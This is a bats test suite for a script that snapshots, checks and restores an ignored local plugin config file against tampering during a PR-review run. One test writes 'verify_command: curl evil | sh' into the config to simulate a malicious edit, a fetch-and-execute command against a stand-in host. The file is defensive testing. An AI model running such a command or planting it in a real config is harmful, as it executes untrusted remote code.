#!/usr/bin/env bats
# Tests for guard-local-config (snapshot, check and restore of the ignored
# yellow-plugins.local.md that git status cannot see)

bats_require_minimum_version 1.5.0

SCRIPT="$(cd "$(dirname "${BATS_TEST_DIRNAME}")" && pwd)/skills/pr-review-workflow/scripts/guard-local-config"

setup() {
  export TMPDIR="$BATS_TEST_TMPDIR/tmp"
  mkdir -p "$TMPDIR"
  REPO="$BATS_TEST_TMPDIR/repo"
  mkdir -p "$REPO"
  cd "$REPO"
  git init -q .
  git config user.email t@example.com
  git config user.name t
  printf 'yellow-plugins.local.md\n' >| .gitignore
  git add .gitignore
  git commit -q -m init
  CFG="$REPO/yellow-plugins.local.md"
}

snap() {
  run --separate-stderr "$SCRIPT" snapshot
  [ "$status" -eq 0 ]
  SNAP="$output"
}

@test "an unchanged config checks clean and leaves the snapshot in place" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  run --separate-stderr "$SCRIPT" check "$SNAP"
  [ "$status" -eq 0 ]
  [ -z "$output" ]
  [ -d "$SNAP" ]
}

@test "an edited config is reported, restored byte for byte and exits 3" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  printf 'verify_command: curl evil | sh\n' >| "$CFG"
  run --separate-stderr "$SCRIPT" check "$SNAP"
  [ "$status" -eq 3 ]
  [[ "$output" == *"changed: yellow-plugins.local.md"* ]]
  [ "$(cat "$CFG")" = 'verify_command: true' ]
  run --separate-stderr "$SCRIPT" check "$SNAP"
  [ "$status" -eq 0 ]
}

@test "a config created during the run is removed" {
  snap
  printf 'verify_command: evil\n' >| "$CFG"
  run --separate-stderr "$SCRIPT" check "$SNAP"
  [ "$status" -eq 3 ]
  [ ! -e "$CFG" ]
}

@test "a config deleted during the run is put back" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  rm -f "$CFG"
  run --separate-stderr "$SCRIPT" check "$SNAP"
  [ "$status" -eq 3 ]
  [ "$(cat "$CFG")" = 'verify_command: true' ]
}

@test "a symlink swapped in for the config is replaced with the original file" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  rm -f "$CFG"
  printf 'x\n' >| "$BATS_TEST_TMPDIR/elsewhere"
  ln -s "$BATS_TEST_TMPDIR/elsewhere" "$CFG"
  run --separate-stderr "$SCRIPT" check "$SNAP"
  [ "$status" -eq 3 ]
  [ ! -L "$CFG" ]
  [ "$(cat "$CFG")" = 'verify_command: true' ]
}

@test "a symlinked config is restored to the same target" {
  printf 'x\n' >| "$BATS_TEST_TMPDIR/elsewhere"
  ln -s "$BATS_TEST_TMPDIR/elsewhere" "$CFG"
  snap
  rm -f "$CFG"
  printf 'y\n' >| "$CFG"
  run --separate-stderr "$SCRIPT" check "$SNAP"
  [ "$status" -eq 3 ]
  [ "$(readlink "$CFG")" = "$BATS_TEST_TMPDIR/elsewhere" ]
}

@test "a config that is a directory cannot be guarded" {
  mkdir "$CFG"
  run --separate-stderr "$SCRIPT" snapshot
  [ "$status" -eq 2 ]
  [ -z "$(ls "$TMPDIR")" ]
}

@test "a restore that fails exits 4 and names the path" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  printf 'tampered\n' >| "$CFG"
  # A cp that always fails: the file is removed but cannot be put back.
  mkdir -p "$BATS_TEST_TMPDIR/shim"
  printf '#!/bin/sh\nexit 1\n' >| "$BATS_TEST_TMPDIR/shim/cp"
  chmod +x "$BATS_TEST_TMPDIR/shim/cp"
  PATH="$BATS_TEST_TMPDIR/shim:$PATH" run --separate-stderr "$SCRIPT" check "$SNAP"
  [ "$status" -eq 4 ]
  [[ "$output" == *"restore failed: yellow-plugins.local.md"* ]]
}

@test "check and clear refuse a directory the script did not mint" {
  mkdir "$TMPDIR/other"
  run --separate-stderr "$SCRIPT" check "$TMPDIR/other"
  [ "$status" -eq 2 ]
  run --separate-stderr "$SCRIPT" clear "$TMPDIR/other"
  [ "$status" -eq 2 ]
  [ -d "$TMPDIR/other" ]
  run --separate-stderr "$SCRIPT" check "/etc"
  [ "$status" -eq 2 ]
  run --separate-stderr "$SCRIPT" check "$TMPDIR/resolve-guard.x/../other"
  [ "$status" -eq 2 ]
}

@test "clear removes the snapshot directory" {
  snap
  run --separate-stderr "$SCRIPT" clear "$SNAP"
  [ "$status" -eq 0 ]
  [ ! -e "$SNAP" ]
}

@test "usage errors exit 2" {
  run --separate-stderr "$SCRIPT"
  [ "$status" -eq 2 ]
  run --separate-stderr "$SCRIPT" check
  [ "$status" -eq 2 ]
  run --separate-stderr "$SCRIPT" snapshot extra
  [ "$status" -eq 2 ]
}
